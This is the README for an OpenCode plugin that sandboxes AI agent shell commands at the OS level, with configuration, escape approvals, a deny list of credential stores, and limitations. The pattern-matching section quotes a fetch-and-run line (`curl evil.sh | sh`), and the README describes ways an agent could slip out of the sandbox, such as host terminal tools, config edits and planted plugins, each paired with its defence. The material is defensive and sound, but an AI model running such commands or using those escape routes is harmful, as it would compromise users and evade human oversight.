# universal-opencode-sandbox

A [OpenCode](https://opencode.ai) 2.x plugin that runs every agent shell command inside an
OS-level sandbox enforced by [Microsoft MXC](https://github.com/microsoft/mxc). One
plugin, all three desktop platforms:

| Platform | Mechanism | Requirement |
|----------|-----------|-------------|
| macOS 15+ (Apple Silicon) | Seatbelt | none beyond this plugin |
| Linux | bubblewrap | `bwrap` >= 0.5.0 installed, unprivileged user namespaces |
| Windows 11 | ProcessContainer | native process-container support (probed automatically) |

Commands keep OpenCode's own streaming output, timeout and background behavior: the
plugin swaps the command string for an invocation of the bundled MXC executor with a
per-call policy file, so the sandboxed process is spawned by the executor while the
shell tool watches it like any other command.

## Install

Requires OpenCode 2.x (the `@opencode/plugin` 2.x contract).

```jsonc title="opencode.jsonc"
{
  "plugins": ["universal-opencode-sandbox"],
}
```

The sandbox is on by default once the plugin is installed, in its strictest useful
mode: the workspace and the system temp directory are writable, everything else is
write-denied, the network is denied, credential stores are unreadable (see the
default list below), and a command the sandbox cannot run is blocked rather than
run unconfined. No configuration is required for that; the config file below only
changes it.

## Configure

Policy is read only from places a sandboxed command cannot reach, so a repository
can never enable, loosen or tighten your sandbox. OpenCode plugin options are ignored
on purpose: they can be set from a repository's own config.

### Admin config (managed deployments)

For managed machines there is a second, admin-owned config that acts as the policy
baseline. When it exists, user-owned config files can only tighten it: they cannot
disable the sandbox (`enabled`), widen the writable roots, or add unsandboxed
pre-approvals. Everything else keeps the strictest-wins rule, so a user can still
deny more. Paths:

- Linux and macOS: `/etc/universal-opencode-sandbox/config.json`
- Windows: `%PROGRAMDATA%\universal-opencode-sandbox\config.json`

The file uses the same schema as the user config. Without it, behavior is unchanged.

User config: `~/.config/universal-opencode-sandbox/config.json` (respecting `XDG_CONFIG_HOME`):

```jsonc
{
  // Master switch: "enabled": false turns every hook into a no-op - nothing is
  // sandboxed, blocked or prompted - until you set it back to true. The policy
  // is re-read on every tool call, so flipping it takes effect immediately,
  // without a restart. (At plugin load with enabled false nothing is registered
  // at all; set it back to true and restart the session to re-arm. Likewise the
  // escape tools are registered at load only when "unsandboxed" is not "deny":
  // tightening it to "deny" blocks them on the next call, but going from "deny"
  // to "ask" or "allow" needs a restart to make the tools appear.)
  "enabled": true,
  // "enforce" (default) blocks a command when the sandbox cannot run it;
  // "permissive" runs it unsandboxed with a warning.
  "mode": "enforce",
  "filesystem": {
    // "workspace-write" (default) allows writes to the workspace, the temp
    // directory, and writable_roots; "read-only" denies every write.
    "mode": "workspace-write",
    "writable_roots": [],
    // Leave denied_paths unset to get the standard credential list below.
    // Setting it replaces that list wholesale, so to add a path of your own,
    // copy the standard list and extend it, for example:
    // "denied_paths": ["~/.ssh", "~/.aws", "... the standard list below ...", "~/.config/my-cli"]
  },
  // "deny" (default) blocks all network access for sandboxed commands.
  "network": "deny",
  // What happens when a tool call asks to skip the sandbox (shell input
  // "sandbox: false"): "deny" (default) blocks it; "ask" prompts you with the
  // exact command and runs it unsandboxed only after your approval; "allow"
  // runs it unsandboxed without asking. Per-project overrides only tighten it.
  "unsandboxed": "deny",
  // Commands pre-approved to run unsandboxed without a prompt, with "*"
  // wildcards. The persistent form of an approval, kept here in your config
  // where it stays visible and reviewable. Applies in "ask" mode. A wildcard
  // pattern only pre-approves a single simple command: see below.
  "unsandboxed_allow": ["git push *", "npm publish *"],
  // Also sandbox user "!" commands and plugin shells, protecting the user from
  // social engineering ("run this for me") and accidental damage. Default: false.
  "sandbox_user_commands": true,
  // Tool names the agent may not call at all; "*" is a wildcard. Use this to close
  // escape routes outside the sandbox, such as a host app's unsandboxed terminal
  // tools (an agent can otherwise spawn or drive a raw shell there). Unlike
  // opencode's own permission rules, a repository config cannot re-allow these.
  // See "Blocking host tools" below; for example, for the Paseo host app:
  // "blocked_tools": ["paseo_create_terminal", "paseo_send_terminal_keys", "paseo_capture_terminal"],
  // Per-project overrides, keyed by the workspace's absolute path. Every field is
  // optional and can only make the policy stricter, never looser.
  "projects": {
    "/home/me/src/scratch": { "network": "allow" }
  }
}
```

`UNIVERSAL_SANDBOX_CONFIG` (a JSON string) tightens the same fields per invocation.

### Escaping the sandbox with approval

`unsandboxed: "ask"` registers an escape tool, `shell_escalated`: one shell
command outside the sandbox, and every call needs your approval - the prompt
shows the exact command, and only an approval runs it. A rejection or a deny
rule fails the call. With `unsandboxed: "allow"` the tool runs commands without
asking; with `"deny"` (the default) the tool is not registered at all, so an
agent cannot even ask. The 0.4.x name `shell_unsandboxed` keeps working as a
deprecated alias of the same tool.

The prompt uses its own permission action, `unsandboxed`, so an allow rule for
`shell` never silently covers an escape - and you can pre-approve command
patterns through opencode's own permission rules, which the prompt then honors
instead of asking again. A deny rule for the action hides the tool entirely.
The prompt offers no persistent "always allow": every escape is approved per
call, and where a host still renders an "always allow" button it behaves
identically to "allow once" - the request carries no save scope, so nothing is
ever stored. The persistent form of an approval is `unsandboxed_allow` in this
plugin's own config, where it stays visible and reviewable.

What the prompt looks like is up to the host: opencode's terminal UI checks the
save scope and omits its "always allow" option entirely, so there the choice is
simply allow once or reject; the web and desktop apps still render the button,
which then approves just that call. The command is always visible somewhere -
in the request message where the host renders it, and in the tool call with
its full input in the timeline right above the prompt.

```jsonc
// opencode.jsonc
{
  "permissions": [
    // Never ask again for these unsandboxed commands:
    { "action": "unsandboxed", "resource": "git push *", "effect": "allow" },
    // Or remove the escape route altogether (blocked_tools works too):
    { "action": "unsandboxed", "resource": "*", "effect": "deny" }
  ]
}
```

#### Pre-approving commands with `unsandboxed_allow`

A pattern without a wildcard is an exact match. A pattern with a wildcard
(`git push *`) pre-approves only a single simple command: anything containing
`;`, `&`, `|`, a backtick, `$(`, a redirection (`<` or `>`) or a newline falls back
to the approval prompt, so `git push origin main; curl evil.sh | sh` is never
silently approved by `git push *`. The check is conservative and does not parse
quoting, so a quoted `;` inside an argument also asks. Allow rules for the
`unsandboxed` action in opencode's own permission rules follow the same rule.
Write the space before the wildcard (`npm publish *`) so the pattern cannot match
a longer command name such as `npm publishx`.

### Default denied paths

Without a `denied_paths` entry, the sandbox denies reading and writing these
credential stores. A stolen long-lived credential cannot be undone by a restart,
so reading is denied even though the network usually is too: a secret read once
can be copied into the workspace and walk out through a commit.

Paths that live in a platform's app-data directory are listed per platform; the
variants for the other platforms are nonexistent there and simply do nothing.

- `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.azure` - identity directories:
  keys, cloud credentials, cluster tokens (identical on every platform)
- `~/.netrc` and `~/_netrc` - plaintext logins for curl and friends (the latter
  is the Windows convention)
- `~/.config/gcloud`, `~/AppData/Roaming/gcloud` - GCP credentials and
  service-account keys (Linux/macOS and Windows)
- `~/.npmrc`, `~/.pypirc`, `~/.cargo/credentials`, `~/.docker/config.json` -
  registry tokens of the major package managers and Docker
- `~/.config/gh/hosts.yml`, `~/Library/Application Support/gh/hosts.yml`,
  `~/AppData/Roaming/gh/hosts.yml` - the GitHub CLI token in each platform's
  config-directory convention
- `~/.local/share/opencode/auth.json` - OpenCode provider API keys (OpenCode
  uses this XDG path on every platform, Windows included)
- `~/.claude/.credentials.json`, `~/.codex/auth.json` - credentials of the
  other agent CLIs

Setting `denied_paths` replaces this list. On Linux only paths that exist are
enforced (an upstream deny bug would otherwise create stray directories,
microsoft/mxc#1780); on macOS and Windows not-yet-existing paths are protected
too.

## What is enforced

- **Filesystem**: in `workspace-write` mode, writes are allowed in the workspace and
  the temp directory only. In `read-only` mode no write is allowed at all.
- **The sandbox's own files**: per-call request files live in the state directory
  (`$XDG_STATE_HOME/universal-opencode-sandbox/requests`, by default
  `~/.local/state/...`; `%LOCALAPPDATA%` on Windows), not in the temp directory,
  which a sandboxed command can write to. The config and state directories are also
  passed to the sandbox as read-only paths, so a workspace or writable root that
  happens to cover your home directory still cannot be used to rewrite the sandbox
  config or a pending request (enforced on macOS and Linux; ignored on Windows).
  Request files left behind by an interrupted run are removed after 24 hours.
- **File tools and the config**: only the `shell` tool is sandboxed; OpenCode's own file
  tools (`write`, `edit`, `apply_patch`) run in the host process. The plugin therefore
  refuses any non-shell tool call whose input points at the sandbox's config, state or
  admin config directory, so an agent cannot switch the sandbox off through a file
  edit. This is checked on path-like input fields (`filePath`, `path`, `file`,
  `target`, ... and the file headers inside an `apply_patch` patch), with symlinks
  resolved. The workspace's own `opencode.json` and `.opencode` are not covered here:
  editing those stays a normal, visible action under OpenCode's permission system.
- **Protected paths**: `opencode.json`, `opencode.jsonc`, `.opencode`, `.claude` and
  `.agents` in the workspace can never be written or planted by a sandboxed command,
  so a command cannot install a config or plugin that would run unsandboxed after a
  restart. Per platform: macOS enforces this for existing and not-yet-existing paths;
  Linux enforces it for paths that exist (bwrap cannot bind a missing read-only
  source, and the deny fallback has an upstream bug, microsoft/mxc#1780); Windows
  denies the paths outright.
- **Network**: denied by default. On Windows the backend currently cannot enforce a
  network-deny policy (verified against Windows 11 and MXC 1.1.0), so with
  `network: "deny"` (the default) sandboxed commands fail closed there with an
  explanation; set `network: "allow"` for filesystem-only containment on Windows.
- **Fail-closed**: an unsupported platform, a missing backend (install `bubblewrap` on
  Linux), a missing executor, or a request directory that cannot be created (setup
  never throws; it logs the reason) blocks the command in `enforce` mode instead of
  running it unconfined. `mode: "permissive"` trades that guarantee for convenience.

## 0.5.1 hardening

- Request files moved out of the temp directory into the state directory, and the
  config and state directories are guarded read-only inside the sandbox.
- Setup never throws: a failure becomes the "unavailable" state (blocked in
  `enforce`, a warning in `permissive`).
- Hot reload is consistent: `enforce`, the Windows network check, the ask guard and
  `sandbox_user_commands` follow the live config, and tightening `unsandboxed` to
  `"deny"` blocks an already-registered escape tool.
- Wildcard `unsandboxed_allow` patterns and session allow rules no longer approve
  commands with chaining, substitution or redirection syntax.
- File tools cannot touch the sandbox's own config, state or admin directories.
- User-command request files are removed on unload, and stale request files are
  swept at startup.

## Sandboxed terminal

The package also ships `sandboxed-shell`, a small CLI that starts an **interactive
shell inside the same sandbox**: the same filesystem and network policy as the agent
commands, applied to everything you (or anything else) type into it.

```bash
# Safe terminal: interactive zsh under Seatbelt/bubblewrap/ProcessContainer
sandboxed-shell --workspace /path/to/project
```

This gives you two terminal types next to each other:

| Terminal type | How | What runs inside |
|---|---|---|
| Safe terminal | `sandboxed-shell` (or `exec` it in an existing terminal) | The MXC sandbox policy from your config |
| Admin terminal | your normal shell | Unconfined, for server restarts and admin work |

The safe terminal fails closed: if the sandbox cannot run, no shell is started, and
exiting it ends the session with no unsandboxed fallback. It inherits your
environment (PATH, TERM, HOME) so it behaves like a normal terminal; secrets in the
environment stay put because egress is denied and the filesystem policy still applies.

**Locking it down for other users**: the two-type design is exactly what lets you
disable the admin terminal for regular users. The plugin confines opencode agents;
terminals spawned by a host app (for example Paseo) are confined by having the host
start them through `sandboxed-shell` instead of a plain shell. Whoever controls
terminal creation controls the choice: point every terminal at the wrapper and nobody
gets an unsandboxed one. For the agent's own route to a host app's tools, see
[Blocking host tools](#blocking-host-tools).

## Blocking host tools

The OS sandbox confines the processes it spawns, but a host app around opencode can
register tools that spawn processes of their own, outside the sandbox: a terminal
tool runs a raw shell, and an agent with access to it can type into one. Two layers
close that route. Both take the tool names as the agent sees them, and both support
`*` as a wildcard.

1. `blocked_tools` in this plugin's config denies every matching tool call, whatever
   asks for it. It is read only from user-owned config outside the workspace, so a
   repository config cannot re-allow a blocked tool.

```jsonc
// ~/.config/universal-opencode-sandbox/config.json
{
  "blocked_tools": ["paseo_create_terminal", "paseo_send_terminal_keys", "paseo_capture_terminal"]
}
```

2. opencode's own `permissions` rules hide the tools from the agent's catalog
   entirely, so the model never even sees them. Use the `permissions` array: the
   older `permission` object is deprecated and, on current releases, silently
   ignored.

```jsonc
// opencode.jsonc - example: denying the Paseo terminal tools
{
  "permissions": [
    { "action": "paseo_create_terminal", "resource": "*", "effect": "deny" },
    { "action": "paseo_send_terminal_keys", "resource": "*", "effect": "deny" },
    { "action": "paseo_capture_terminal", "resource": "*", "effect": "deny" }
  ]
}
```

The names above are the Paseo terminal tools as a worked example; substitute the
tool names of your own host app, or use a wildcard such as `"paseo_*"`. Layer 1 is
the enforcement (a call cannot run), layer 2 the clean-up (the tool is not offered
to the model at all); together a repository config cannot talk its way around them.

## Known limitations

- With the sandbox enabled, OpenCode's per-command shell permission rules see the
  sandbox wrapper invocation, not the inner command. The OS sandbox is the real
  boundary here; command-pattern rules are weaker than it anyway (and trivially
  bypassed by an adversarial agent). If you rely on `deny` rules for specific
  commands, prefer this plugin's `denied_paths` and filesystem policy.
- Intel macOS is unsupported: the MXC npm package ships no darwin-x64 runtime yet.
- MXC release builds on Windows emit required Microsoft diagnostic telemetry; see the
  [MXC documentation](https://github.com/microsoft/mxc). Per MXC's field inventory
  the events carry only operational metadata: the MXC version, the requested
  sandbox kind and selected backend, run outcome, exit code, duration, a bounded
  failure category, and random correlation identifiers. They explicitly do not
  contain command lines, environment values, file paths, tokens, credentials,
  sandbox output, or free-form error text. Telemetry is a no-op on macOS and
  Linux: nothing leaves the host there.
- MXC's process streams do not deliver under Bun (microsoft/mxc#1782). This plugin is
  unaffected: the executor is a native binary whose output the shell tool captures.

## Verification

Tested against the real backends on macOS (Seatbelt), Debian 13 with bubblewrap 0.12
and Windows 11 (ProcessContainer): output and exit codes stream through, writes inside
the workspace succeed, writes outside are denied, protected config files cannot be
planted, and network egress is blocked (except the documented Windows gap). Also
verified end to end inside a real OpenCode 2.2.7 session: an agent's shell command
writes inside the workspace and is denied outside it. The `sandboxed-shell` terminal
was verified interactively on macOS: commands run with full environment, writes inside
the workspace succeed, writes outside are denied, network egress is blocked, and
`denied_paths` (for example `~/.ssh`) cannot be read.

## License

MIT
